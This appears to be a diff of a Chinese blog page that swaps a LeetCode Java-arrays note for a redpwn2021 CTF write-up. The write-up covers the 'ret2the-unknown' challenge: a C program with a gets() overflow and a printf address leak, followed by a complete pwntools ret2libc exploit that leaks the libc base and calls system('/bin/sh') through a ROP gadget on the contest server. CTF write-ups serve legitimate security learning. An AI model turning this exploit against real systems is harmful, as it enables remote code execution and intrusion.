@@ -6,19 +6,19 @@
   <meta name="renderer" content="webkit">
   <meta http-equiv="X-UA-Compatible" content="IE=edge" >
   <link rel="dns-prefetch" href="http://example.com">
-  <title>Array | JAckLosingHeart</title>
+  <title>redpwn2021 | JAckLosingHeart</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta name="description" content="当算法本身只能暴力算法的时候，便可以考虑从数据结构上下手提高效率，比如改用hashmap提高查询效率。 几乎任何类型的数组都可以用Arrays.sort()来直接排序，它会帮你按照你定义的大小关系从小到大重新排列这个数组。第一个参数传入你的数组，第二个参数可以直接传入一个lamda表达式（匿名内部类）：(a, b) -&gt; 你要return的东西。重要的是记住a &lt; b的时候retur">
+  <meta name="description" content="redpwn2021 writeup就放两道自己做出来并且值得写一下的题把 pwn - rettounknow这就是一道经典的libc基地址每次运行都会变的ret2libc 首先，通过这道题我学到了下面几点：  动态连接库在一个process的virtual address space setup的时候会被全部载入到内存中的，因为shared library之所以叫shared library就是">
 <meta property="og:type" content="article">
-<meta property="og:title" content="Array">
-<meta property="og:url" content="http://example.com/2021/01/08/Array/index.html">
+<meta property="og:title" content="redpwn2021">
+<meta property="og:url" content="http://example.com/2021/08/12/redpwn2021/index.html">
 <meta property="og:site_name" content="JAckLosingHeart">
-<meta property="og:description" content="当算法本身只能暴力算法的时候，便可以考虑从数据结构上下手提高效率，比如改用hashmap提高查询效率。 几乎任何类型的数组都可以用Arrays.sort()来直接排序，它会帮你按照你定义的大小关系从小到大重新排列这个数组。第一个参数传入你的数组，第二个参数可以直接传入一个lamda表达式（匿名内部类）：(a, b) -&gt; 你要return的东西。重要的是记住a &lt; b的时候retur">
+<meta property="og:description" content="redpwn2021 writeup就放两道自己做出来并且值得写一下的题把 pwn - rettounknow这就是一道经典的libc基地址每次运行都会变的ret2libc 首先，通过这道题我学到了下面几点：  动态连接库在一个process的virtual address space setup的时候会被全部载入到内存中的，因为shared library之所以叫shared library就是">
 <meta property="og:locale" content="en_US">
-<meta property="article:published_time" content="2021-01-08T20:58:16.000Z">
-<meta property="article:modified_time" content="2021-01-09T15:10:32.751Z">
+<meta property="article:published_time" content="2021-08-13T03:39:08.000Z">
+<meta property="article:modified_time" content="2021-08-13T04:13:16.510Z">
 <meta property="article:author" content="JAckLosingHeart">
-<meta property="article:tag" content="Leetcode">
+<meta property="article:tag" content="CTF">
 <meta name="twitter:card" content="summary">
   
     <link rel="alternative" href="/atom.xml" title="JAckLosingHeart" type="application/atom+xml">
@@ -136,36 +136,52 @@
             <canvas data-colors="#eaeaea" data-sectionHeight="100" data-contentId="js-content" id="myCanvas1" class="anm-canvas"></canvas>
           </div>
           <div id="js-content" class="content-ll">
-            <article id="post-Array" class="article article-type-post " itemscope itemprop="blogPost">
+            <article id="post-redpwn2021" class="article article-type-post " itemscope itemprop="blogPost">
   <div class="article-inner">
     
       <header class="article-header">
         
   
     <h1 class="article-title" itemprop="name">
-      Array
+      redpwn2021
     </h1>
   
 
         
-        <a href="/2021/01/08/Array/" class="archive-article-date">
-  	<time datetime="2021-01-08T20:58:16.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2021-01-08</time>
+        <a href="/2021/08/12/redpwn2021/" class="archive-article-date">
+  	<time datetime="2021-08-13T03:39:08.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2021-08-12</time>
 </a>
         
       </header>
     
     <div class="article-entry" itemprop="articleBody">
       
-        <ul>
-<li>当算法本身只能暴力算法的时候，便可以考虑从数据结构上下手提高效率，比如改用hashmap提高查询效率。</li>
-<li>几乎任何类型的数组都可以用Arrays.sort()来直接排序，它会帮你按照你定义的大小关系从小到大重新排列这个数组。第一个参数传入你的数组，第二个参数可以直接传入一个lamda表达式（匿名内部类）：(a, b) -&gt; 你要return的东西。重要的是记住a &lt; b的时候return一个负数，这算是默认大家遵守的规范？</li>
-<li>Arrays.asList(a, b, c)可以直接返回一个由a, b, c构成的list</li>
-<li>380 Insert Delete GetRandom O(1) 确是道好题，通过把ArrayList和Hashmap结合得到了最终解决方案。Hashmap帮助ArrayList解决了remove时搜索和移位都是O(n)的问题，而ArrayList则帮助Hashmap解决了getRandom需要index的问题</li>
-<li>Random类可以用nextInt(n)取随机数, The method call returns a pseudorandom, uniformly distributed int value between 0 (inclusive) and n (exclusive).</li>
-<li>我才知道的非常重要的一件事：list remove函数传入立即数或者int型变量，会按照传入值是index删除，传如Object的子类才会按照值删除，而且只会删除第一个出现的值</li>
-<li>map remove当然remove的是key</li>
+        <h1 id="redpwn2021-writeup"><a href="#redpwn2021-writeup" class="headerlink" title="redpwn2021 writeup"></a><strong>redpwn2021 writeup</strong></h1><p>就放两道自己做出来并且值得写一下的题把</p>
+<h2 id="pwn-rettounknow"><a href="#pwn-rettounknow" class="headerlink" title="pwn - rettounknow"></a>pwn - rettounknow</h2><p>这就是一道经典的libc基地址每次运行都会变的ret2libc</p>
+<p>首先，通过这道题我学到了下面几点：</p>
+<ul>
+<li>动态连接库在一个process的virtual address space setup的时候会被全部载入到内存中的，因为shared library之所以叫shared library就是它可能会被多个进程share，所以它是会被完整载入内存的。并且会被完整载入每个进程的virtual address space，并且库内相对地址一般不变。所以在这道题里，完全可以通过一个printf函数地址了解库里其它任何一个东西在此进程空间中的地址</li>
+<li>objdump dump一个动态链接库是dump不全，并不能反映动态链接库的真实layout</li>
+<li>gdb里 info shared_libraries 也不能完整显示shared library layout</li>
+<li>gdb里 想看真正的内存中各段地址信息要用info proc map</li>
+<li>pie enable就是会修改每次virtual address space的初始地址</li>
 </ul>
-
+<p>然后看下这道题的源程序：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> your_reassuring_and_comforting_we_will_arrive_safely_in_libc[<span class="number">32</span>];</span><br><span class="line"></span><br><span class="line">  setbuf(<span class="built_in">stdout</span>, <span class="literal">NULL</span>);</span><br><span class="line">  setbuf(<span class="built_in">stdin</span>, <span class="literal">NULL</span>);</span><br><span class="line">  setbuf(<span class="built_in">stderr</span>, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;that board meeting was a *smashing* success! rob loved the challenge!&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;in fact, he loved it so much he sponsored me a business trip to this place called &#x27;libc&#x27;...&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;where is this place? can you help me get there safely?&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// please i cant afford the medical bills if we crash and segfault</span></span><br><span class="line">  gets(your_reassuring_and_comforting_we_will_arrive_safely_in_libc);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;phew, good to know. shoot! i forgot!&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;rob said i&#x27;d need this to get there: %llx\n&quot;</span>, <span class="built_in">printf</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;good luck!&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>之后思路就很清晰了：</p>
+<ol>
+<li>开始交互后，第一次输入先用main函数地址覆盖返回地址</li>
+<li>获得打印的printf函数地址之后，由于main函数覆盖了返回地址，再次进行交互</li>
+<li>这次利用获得的printf地址，我们可以获得下面几个东西：<ul>
+<li>system函数地址</li>
+<li>字符串”/bin/sh”地址</li>
+</ul>
+</li>
+<li>再去找gadget “pop rdi; ret”在application中的地址</li>
+<li>第二次的输入就是，gadget地址覆盖返回地址，接字符串地址，再接system地址，就完事了</li>
+</ol>
+<p>上代码：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">from pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">vuln = ELF(&#x27;ret2the-unknown&#x27;)</span><br><span class="line"># .so同样是ELF，所以同样可以用ELF函数</span><br><span class="line">libc = ELF(&#x27;libc-2.28.so&#x27;)</span><br><span class="line"># ROP参数是一个ELF函数返回值</span><br><span class="line">rop = ROP(vuln)</span><br><span class="line"></span><br><span class="line">payload = &quot;A&quot;*40 + p64(vuln.symbols[&#x27;main&#x27;])</span><br><span class="line"><span class="meta"># print(payload)</span></span><br><span class="line"></span><br><span class="line">p = remote(&#x27;mc.ax&#x27;, 31568)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.recvuntil(&#x27;there: &#x27;)</span><br><span class="line">printf_addr_str = p.recvuntil(&#x27;\n&#x27;).replace(&#x27;\n&#x27;, &#x27;&#x27;)</span><br><span class="line"></span><br><span class="line"># 直接用.symbols获取<span class="built_in">printf</span>函数相对libc头的地址</span><br><span class="line">original_printf_addr_int = libc.symbols[&#x27;printf&#x27;]</span><br><span class="line">printf_addr_int = <span class="keyword">int</span>(printf_addr_str, <span class="number">16</span>)</span><br><span class="line"># 求得libc在内存中的起始地址</span><br><span class="line">libc.address = printf_addr_int - original_printf_addr_int</span><br><span class="line"></span><br><span class="line"># 很方便通过把libc起始地址设好，直接获得system函数和字符串在内存中的地址</span><br><span class="line">system_addr_int = libc.symbols[&#x27;system&#x27;]</span><br><span class="line">binsh_addr_int = next(libc.search(b<span class="number">&#x27;</span>/bin/sh<span class="number">&#x27;</span>))</span><br><span class="line"></span><br><span class="line"># 通过rop库获得gadget地址</span><br><span class="line">poprdi_addr_int = rop.find_gadget([&#x27;pop rdi&#x27;,&#x27;ret&#x27;])[0]</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&quot;A&quot;</span>*<span class="number">40</span></span><br><span class="line">payload += p64(poprdi_addr_int)</span><br><span class="line">payload += p64(binsh_addr_int)</span><br><span class="line">payload += p64(system_addr_int)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
       
 
       
@@ -199,7 +215,7 @@
 		<ul class="article-tag-list">
 			 
         		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">Leetcode</a>
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">CTF</a>
         		</li>
       		
 		</ul>
@@ -255,7 +271,7 @@
     <a class="close js-modal-close" href="javascript:;"><i class="icon icon-close"></i></a>
     <p>扫一扫，分享到微信</p>
     <div class="wx-qrcode">
-      <img src="//pan.baidu.com/share/qrcode?url=http://example.com/2021/01/08/Array/" alt="微信分享二维码">
+      <img src="//pan.baidu.com/share/qrcode?url=http://example.com/2021/08/12/redpwn2021/" alt="微信分享二维码">
     </div>
 </div>
 
@@ -269,15 +285,11 @@
   
 <nav id="article-nav">
   
-    <a href="/2021/01/08/Apollo5-0-AttackAPI/" id="article-nav-newer" class="article-nav-link-wrap">
-      <i class="icon-circle-left"></i>
-      <div class="article-nav-title">
-        
-          Apollo5.0-AttackAPI
-        
-      </div>
-    </a>
   
+    <a href="/2021/07/06/%E7%A8%8B%E5%BA%8F%E5%91%98%E8%B5%B6due%E6%87%92%E4%BA%BA%E8%87%AA%E5%8A%A9%E7%90%86%E5%8F%91%E6%B3%95/" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title">程序员赶due懒人自助理发法</div>
+      <i class="icon-circle-right"></i>
+    </a>
   
 </nav>
 
